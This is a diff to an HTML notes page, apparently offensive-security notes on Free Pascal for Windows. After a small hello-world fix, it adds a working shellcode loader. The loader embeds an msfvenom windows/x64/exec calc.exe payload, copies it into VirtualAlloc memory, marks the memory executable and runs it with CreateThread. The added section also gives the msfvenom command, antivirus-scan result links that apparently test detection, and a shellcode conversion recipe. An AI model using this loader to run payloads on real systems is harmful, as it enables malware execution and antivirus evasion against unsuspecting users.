@@ -168,22 +168,132 @@ program HelloWorldMsg;
 uses Windows;
     
 begin
-    MessageBox(0, 'Hello World Title', 'Hello World Body', 0);
+    MessageBox(0, 'Hello World Body', 'Hello World Title', 0);
 end.
 </code></pre>
                     
-                    <pre><code>
-                        C:\FPC\3.2.2\bin\i386-win32>fpc -Px86_64 -Twin64 C:\Users\p4\Desktop\hello.pas
+<pre><code>
+C:\FPC\3.2.2\bin\i386-win32>fpc -Px86_64 -Twin64 C:\Users\p4\Desktop\hello.pas
     
-                        Free Pascal Compiler version 3.2.2 [2021/05/15] for x86_64
-                        Copyright (c) 1993-2021 by Florian Klaempfl and others
-                        Target OS: Win64 for x64
-                        Compiling C:\Users\p4\Desktop\hello.pas
-                        Linking C:\Users\p4\Desktop\hello.exe
-                        6 lines compiled, 0.1 sec, 32416 bytes code, 1524 bytes data
-                    </code></pre>
-                </p>
+Free Pascal Compiler version 3.2.2 [2021/05/15] for x86_64
+Copyright (c) 1993-2021 by Florian Klaempfl and others
+Target OS: Win64 for x64
+Compiling C:\Users\p4\Desktop\hello.pas
+Linking C:\Users\p4\Desktop\hello.exe
+6 lines compiled, 0.1 sec, 32416 bytes code, 1524 bytes data
+</code></pre>
+                
+
+
+
+
     
+<pre><code>
+                    program simplealloc;
+                    
+                    {$mode delphi}{$H+}
+                    
+                    uses
+                      windows,Classes,strutils,sysutils,crt;
+                    
+                    type
+                      TByteArray = array of byte;
+                    
+                    var
+                      ntHandle: HMODULE = 0;
+                      tHandle: HMODULE = 0;
+                      shellcode: array[0..7] of BYTE = ($90, $90, $90, $90, $90, $90, $CC, $C3);
+                
+                      // msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f c |  sed -r 's/[\x]+/$/g' | sed -r 's/[\]+/,/g' | sed -r 's/["]+//g' | sed -e 's/$/\,/' | cut -c 2-
+                    
+                      shellc: array[0..275] of BYTE = (
+                      $fc,$48,$83,$e4,$f0,$e8,$c0,$00,$00,$00,$41,$51,$41,$50,
+                    $52,$51,$56,$48,$31,$d2,$65,$48,$8b,$52,$60,$48,$8b,$52,
+                    $18,$48,$8b,$52,$20,$48,$8b,$72,$50,$48,$0f,$b7,$4a,$4a,
+                    $4d,$31,$c9,$48,$31,$c0,$ac,$3c,$61,$7c,$02,$2c,$20,$41,
+                    $c1,$c9,$0d,$41,$01,$c1,$e2,$ed,$52,$41,$51,$48,$8b,$52,
+                    $20,$8b,$42,$3c,$48,$01,$d0,$8b,$80,$88,$00,$00,$00,$48,
+                    $85,$c0,$74,$67,$48,$01,$d0,$50,$8b,$48,$18,$44,$8b,$40,
+                    $20,$49,$01,$d0,$e3,$56,$48,$ff,$c9,$41,$8b,$34,$88,$48,
+                    $01,$d6,$4d,$31,$c9,$48,$31,$c0,$ac,$41,$c1,$c9,$0d,$41,
+                    $01,$c1,$38,$e0,$75,$f1,$4c,$03,$4c,$24,$08,$45,$39,$d1,
+                    $75,$d8,$58,$44,$8b,$40,$24,$49,$01,$d0,$66,$41,$8b,$0c,
+                    $48,$44,$8b,$40,$1c,$49,$01,$d0,$41,$8b,$04,$88,$48,$01,
+                    $d0,$41,$58,$41,$58,$5e,$59,$5a,$41,$58,$41,$59,$41,$5a,
+                    $48,$83,$ec,$20,$41,$52,$ff,$e0,$58,$41,$59,$5a,$48,$8b,
+                    $12,$e9,$57,$ff,$ff,$ff,$5d,$48,$ba,$01,$00,$00,$00,$00,
+                    $00,$00,$00,$48,$8d,$8d,$01,$01,$00,$00,$41,$ba,$31,$8b,
+                    $6f,$87,$ff,$d5,$bb,$e0,$1d,$2a,$0a,$41,$ba,$a6,$95,$bd,
+                    $9d,$ff,$d5,$48,$83,$c4,$28,$3c,$06,$7c,$0a,$80,$fb,$e0,
+                    $75,$05,$bb,$47,$13,$72,$6f,$6a,$00,$59,$41,$89,$da,$ff,
+                    $d5,$63,$61,$6c,$63,$2e,$65,$78,$65,$00);
+                    
+                      retp: pointer;
+                      vprb: LongBool;
+                      thrID: DWORD;
+                      len: Integer;
+                      i: Cardinal;
+                      tmp:  array of byte;
+                      pp : Pointer;
+                      lpflOldProtect: PDWORD;
+                    
+                    begin
+                        ntHandle := LoadLibrary('kernelbase.dll');
+                         if ntHandle <> 0 then
+                          begin
+                            len := length(shellc);
+                    
+                            retp := VirtualAlloc(NIL, len, MEM_COMMIT, PAGE_READWRITE);
+                            Writeln(Format('VirtualAlloc %p', [retp]));
+                            ReadKey();
+                            
+                            setlength(tmp,len);
+                            Writeln(Format('shellc len %D', [len]));
+                            ReadKey();
+                            
+                            pp := @shellc;
+                            MoveMemory(retp, pp, len);
+                            WriteLn('Moved memory');
+                            ReadKey();
+                            
+                            vprb := VirtualProtect(retp, len, PAGE_EXECUTE_READ, @lpflOldProtect);
+                            Writeln('VirtualProtect ', vprb);
+                            ReadKey();
+                            
+                            tHandle := CreateThread(nil, 0, retp, nil, 0, thrID);
+                            Writeln('CreateThread ', tHandle);
+                            
+                            WaitForSingleObject(tHandle, INFINITE);
+                          end;
+                    end.
+
+                </code></pre>
+
+            </p>
+            https://www.virustotal.com/gui/file/857cdb2408badac0a2be126d87a2c662015eb45feef665587ce04b62f4357680 ( With calc.exe msfvenom )
+            https://antiscan.me/scan/new/result?id=waKbQuoHFKqS ( With calc.exe msfvenom )
+
+            
+
+
+
+
+            https://labs.nettitude.com/blog/shellcode-source-mutations/
+
+
+
+
+            https://www.virustotal.com/gui/file/13de71e30507caaafc892912e43c55c0530cdf66be7cd8944bd8f3d7a019e26f?nocache=1 (With msfvenom shellcode )
+
+
+            <tr><td><span class="title">Resources to read</span>
+
+            https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%5C%5Ct'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%22'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%5C%5Cx'%7D,',$',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%20%20%20%20,'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%5C%5Cn'%7D,'',true,false,true,false)&input=ICAgICJceDMxXHhjOVx4ZjdceGUxXHg2NFx4OGJceDQxXHgzMFx4OGJceDQwIgoJIlx4MGNceDhiXHg3MFx4MTRceGFkXHg5Nlx4YWRceDhiXHg1OFx4MTAiCgkiXHg4Ylx4NTNceDNjXHgwMVx4ZGFceDhiXHg1Mlx4NzhceDAxXHhkYSIKCSJceDhiXHg3Mlx4MjBceDAxXHhkZVx4MzFceGM5XHg0MVx4YWRceDAxIgoJIlx4ZDhceDgxXHgzOFx4NDdceDY1XHg3NFx4NTBceDc1XHhmNFx4ODEiCgkiXHg3OFx4MDRceDcyXHg2Zlx4NjNceDQxXHg3NVx4ZWJceDgxXHg3OCIKCSJceDA4XHg2NFx4NjRceDcyXHg2NVx4NzVceGUyXHg4Ylx4NzJceDI0IgoJIlx4MDFceGRlXHg2Nlx4OGJceDBjXHg0ZVx4NDlceDhiXHg3Mlx4MWMiCgkiXHgwMVx4ZGVceDhiXHgxNFx4OGVceDAxXHhkYVx4ODlceGQ1XHgzMSIKCSJceGM5XHg1MVx4NjhceDYxXHg3Mlx4NzlceDQxXHg2OFx4NGNceDY5IgoJIlx4NjJceDcyXHg2OFx4NGNceDZmXHg2MVx4NjRceDU0XHg1M1x4ZmYiCgkiXHhkMlx4NjhceDZjXHg2Y1x4NjFceDYxXHg2Nlx4ODFceDZjXHgyNCIKCSJceDAyXHg2MVx4NjFceDY4XHgzM1x4MzJceDJlXHg2NFx4NjhceDU1IgoJIlx4NzNceDY1XHg3Mlx4NTRceGZmXHhkMFx4NjhceDZmXHg3OFx4NDEiCgkiXHg2MVx4NjZceDgzXHg2Y1x4MjRceDAzXHg2MVx4NjhceDYxXHg2NyIKCSJceDY1XHg0Mlx4NjhceDRkXHg2NVx4NzNceDczXHg1NFx4NTBceGZmIgoJIlx4ZDVceDgzXHhjNFx4MTBceDMxXHhkMlx4MzFceGM5XHg1Mlx4NjgiCgkiXHg1MFx4NzdceDZlXHg2NFx4ODlceGU3XHg1Mlx4NjhceDU5XHg2NSIKCSJceDczXHg3M1x4ODlceGUxXHg1Mlx4NTdceDUxXHg1Mlx4ZmZceGQwIgoJIlx4ODNceGM0XHgxMFx4NjhceDY1XHg3M1x4NzNceDYxXHg2Nlx4ODMiCgkiXHg2Y1x4MjRceDAzXHg2MVx4NjhceDUwXHg3Mlx4NmZceDYzXHg2OCIKCSJceDQ1XHg3OFx4NjlceDc0XHg1NFx4NTNceGZmXHhkNVx4MzFceGM5IgoJIlx4NTFceGZmXHhkMCI7
+            https://www.freepascal.org/docs-html/prog/progsu102.html#x109-1100001.2.19
+            https://www.freepascal.org/docs-html/prog/progap4.html#x283-298000D
+            https://www.freepascal.org/docs-html/prog/progse73.html#x286-301000D.3
+            https://www.freepascal.org/docs-html/ref/refsu14.html
+
             </td></tr>
         </table>
     </div>
